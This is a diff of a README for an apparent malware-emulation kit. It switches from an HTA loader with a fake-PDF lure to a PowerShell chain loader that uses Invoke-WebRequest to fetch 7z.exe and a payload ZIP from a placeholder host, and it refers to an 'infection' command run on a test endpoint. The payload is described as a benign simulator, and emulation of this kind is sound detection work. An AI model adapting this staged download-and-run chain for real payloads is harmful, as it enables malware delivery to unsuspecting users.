@@ -1,22 +1,23 @@
-# MSHTA Levaging cURL Usage
+# PWSH Chain Loader Usage
 
-## HTA Modification (REQUIRED!)
+## Payload Creation
 
-Edit the `B.max` file and modify the `fakePdfUrl` value with the location of where you will be hosting the benign "PDF" payload archive and the `B.max` file itself.
+Edit the `nexus-validation.txt` file to change the URL of the two `Invoke-WebRequest` commands. These should point to where you will be hosting the beinign payloads.
 
 _Example:_
 
 ```
-    fakePdfUrl = https://<mysite.com>/928252966059280400.pdf
+Invoke-WebRequest -Uri 'https://<mysite.com>/7z.exe' -OutFile $tool -UseBasicParsing
+Invoke-WebRequest -Uri 'https://<mysite.com>/nexus_payload.zip' -OutFile $zip -UseBasicParsing
 ```
 
-## Payload Creation
+Review the code in `nexus_connector_sim.c` to ensure for yourself that the payload is 100% benign. You may use the included `NexusConnector.exe`, or use `make` to build it yourself.
 
-Review the code in `syncovery_sim.c` to ensure for yourself that the payload is 100% benign. You may use the included `Syncovery.exe`, or use `make` to build it yourself.
+Once you have your `NexusConnector.exe` add it to a ZIP archive `nexus_payload.zip` or use the one provided.
 
 ## Payload Hosting
 
-Copy both `B.max` and `Syncovery.exe` to the URL you specified in the `B.max` HTA file. If you do not place both files in the root of the site, you will need to ensure the `FakePdfUrl` variable in `B.max` reflects this, as well as the "infection" command leveraged on the test endpoint.
+Copy all three files `7z.exe`, `nexus_payload.zip`, and `nexus-validation.txt` to the URL of your choice. If you do not place all three files in the root of the site, you will need to ensure the "infection" command leveraged on the test endpoint points to that URL, as well as the two `Invoke-WebRequest` locations you set in `nexus-validation.txt` above.
 
 ## Disclaimer
 
